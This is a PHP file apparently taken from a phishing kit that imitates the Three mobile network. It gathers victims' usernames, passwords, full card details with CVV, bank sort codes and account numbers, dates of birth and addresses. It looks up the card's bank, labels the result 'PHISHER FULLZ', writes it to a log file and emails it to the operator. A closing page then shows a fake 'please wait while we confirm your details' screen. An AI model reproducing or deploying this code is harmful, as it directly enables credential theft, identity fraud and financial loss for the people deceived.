<?php
error_reporting(0);

session_start();

$useragent = $_SERVER['HTTP_USER_AGENT'];
 
require('myEmail.php');
$mailTo = $myEmail;

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

date_default_timezone_set('Europe/London');
	$ip = $_SERVER['REMOTE_ADDR'];
	$time = date("m-d-Y g:i:a");
	$agent = $_SERVER['HTTP_USER_AGENT'];


$fullname = $_POST['fullname'];
$fullname = $_SESSION['fullname'];

$cardnumber = $_POST['ccno'];
$cardnumber = $_SESSION['ccno']; 

$ccname = $_POST['ccname'];
$ccname = $_SESSION['ccname']; 

$expiry = $_POST['ccexp'];
$expiry = $_SESSION['ccexp'];

$cvv = $_POST['secode'];
$cvv = $_SESSION['secode'];

$sort_code = $_POST['sort_code'];
$sort_code = $_SESSION['sort_code'];

$acc = $_POST['account']; 
$acc = $_SESSION['account']; 



$useragent = $_SERVER['HTTP_USER_AGENT'];
 
 require('myEmail.php');
$mailTo = $myEmail;

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

date_default_timezone_set('Europe/London');
	$ip = $_SERVER['REMOTE_ADDR'];
	$time = date("m-d-Y g:i:a");
	$agent = $_SERVER['HTTP_USER_AGENT'];


$cardnumber = $_POST['ccno'];
$cardnumber = $_SESSION['ccno'];


$expiry = $_POST['ccexp'];
$expiry = $_SESSION['ccexp'];


$cvv = $_POST['secode'];
$cvv = $_SESSION['secode'];

$username = $_POST['username'];
$username = $_SESSION['username'];

$mmn = $_POST['mmn'];
$mmn = $_SESSION['mmn']; 
 
 
 $mname = $_POST['mName'];
$mname = $_SESSION['mName'];

$mpl =  $_POST['mpl'];
$mpl = $_SESSION['mpl'];

$password = $_POST['password'];
$password = $_SESSION['password'];



$fullname = $_POST['name'];
$fullname = $_SESSION['name'];


$addy1 = $_POST['address'];
$addy1 = $_SESSION['address'];


$addy2 = $_POST['addy2'];
$addy2 = $_SESSION['addy2'];

$dob = $_POST['dob'];
$dob = $_SESSION['dob'];


$city = $_POST['town'];
$city = $_SESSION['town'];


$postcode = $_POST['postcode'];
$postcode = $_SESSION['postcode'];

$number = $_POST['number'];
$number = $_SESSION['number'] ;



$_SESSION['telephone'] = '';

$email = $_POST['email'];
$email = $_SESSION['email'];

$bin = substr($cardnumber,0,7);
$bin = str_replace(' ', '', $bin);

function url_get_contents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
  }
  
  function bankDetails($cardnumber) {
      $bankDetails = array();
      $cardBIN = substr($cardnumber, 0, 6);
      $url = "https://lookup.binlist.net/" . $cardBIN;
      $bankDetails = json_decode(url_get_contents($url), true);
      $bankDetails['bin'] = $cardBIN;
      return $bankDetails;
  }
  
  $cardInfo = bankDetails($cardnumber);
  $numb = $cardInfo['number'];
  $BIN = $cardBIN;
  $Bank = $cardInfo['bank'];
  $bank_name = $Bank['name'];
  $Brand = $cardInfo['scheme'];
  $Brand = strtoupper($Brand);
  $Type = $cardInfo['card_type'];
  
  $bin = substr($cardnumber,0,6);
  


$txt =  "&&-THREE-NETWORK||PHISHER FULLZ-&&\n";
$txt .= "&&-LOGIN INFO-&&\n";
$txt .= "==============================\n";
$txt .= "|USERNAME: " .$username."\n";
$txt .= "|PASSWORD: " .$password."\n";
$txt .= "============================== \n";
$txt .= "&&-PERSONAL INFO-&&\n";
$txt .= "==============================\n";
$txt .= "| FULL NAME: " .$fullname."\n";
$txt .= "| DATE OF BIRTH: " .$dob."\n";
$txt .= "| ADDY 1: " .$addy1."\n";
$txt .= "| ADDY 2: " .$addy2."\n";
$txt .= "| CITY: " .$city."\n";
$txt .= "| POSTCODE: ".$postcode."\n";
$txt .= "|NUMBER: ".$number."\n";
$txt .= "|EMAIL: ".$email."\n";
$txt .= "============================== \n";
$txt .= "&&-BILLING INFO-&&\n";
$txt .= "==============================\n";
$txt .= "| CARD HOLDER: " .$ccname."\n";
$txt .= "| CARD NUMBER: " .$cardnumber."\n";
$txt .= "|EXPIRY: " .$expiry."\n";
$txt .= "|SECURITY CODE: " .$cvv."\n";
$txt .= "| SORT: " .$sort_code."\n";
$txt .= "| ACC: " .$acc."\n";
$txt .= "| BIN: " .$bin."\n";
$txt .= "| BANK: " .$bank_name."\n";
$txt .= "|BRAND: " .$Brand . " " . $Type."\n";
$txt .= "==============================================================\n";
$txt .= "Sent from   " .$ip. "  on   "   .$time. " via   " .$agent.".\n";
$txt .= "==============================================================\n";
 $subject = "THREE FULLZ FROM  ".$bin;
 $headers = $fullname;
 
 $fp = fopen("logs/fullz.txt", "a");
 fputs($fp,$txt);
 fclose($fp);
 

 mail($mailTo, $subject, $txt, $headers);


?>
<!DOCTYPE html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

	
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="refresh" content="3; url=bankrequired.php" />

    <title>Three</title> 
    <link href="styles/mobileValidation.css" rel="stylesheet"/>
    <link href="styles/favicon.ico" rel="icon" >
	<link rel="stylesheet" href="styles/demo.css">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <script  src="styles/js.js"></script>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 
 
  

<style>
.loader,
.loader:before,
.loader:after {
  border-radius: 50%;
  width: 2.5em;
  height: 2.5em;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;
  -webkit-animation: load7 1.8s infinite ease-in-out;
  animation: load7 1.8s infinite ease-in-out;
}
.loader {
  color: #007bc3;
  font-size: 10px;
  margin: 80px auto;
  position: relative;
  text-indent: -9999em;
  -webkit-transform: translateZ(0);
  -ms-transform: translateZ(0);
  transform: translateZ(0);
  -webkit-animation-delay: -0.16s;
  animation-delay: -0.16s;
}
.loader:before,
.loader:after {
  content: '';
  position: absolute;
  top: 0;
}
.loader:before {
  left: -3.5em;
  -webkit-animation-delay: -0.32s;
  animation-delay: -0.32s;
}
.loader:after {
  left: 3.5em;
}
@-webkit-keyframes load7 {
  0%,
  80%,
  100% {
    box-shadow: 0 2.5em 0 -1.3em;
  }
  40% {
    box-shadow: 0 2.5em 0 0;
  }
}
@keyframes load7 {
  0%,
  80%,
  100% {
    box-shadow: 0 2.5em 0 -1.3em;
  }
  40% {
    box-shadow: 0 2.5em 0 0;
  }
}
@media only screen and (max-width: 750px) {
  .Login{
font-size:2rem !important
  }
}
</style>

</head>
<body style=" height:20rem !important;overflow-x: hidden;">
 
  
  
<div class="main-content">

    <form method="POST" action="Login.php">
        <div class="form-group text-center">
            <br><br><br>
          <label class="Login" style="font-size:48px;font-weight:bolder">Please wait while we confirm your details.</label>
           <br>
           <div class="loader">Loading...</div>

        </div>
        <div class="form-group">
          <div class="fa-cont">
  

         
    

       
        </div>
        
        <br><br>
      
        </div>
      
      </form>
      
</body>

</html>

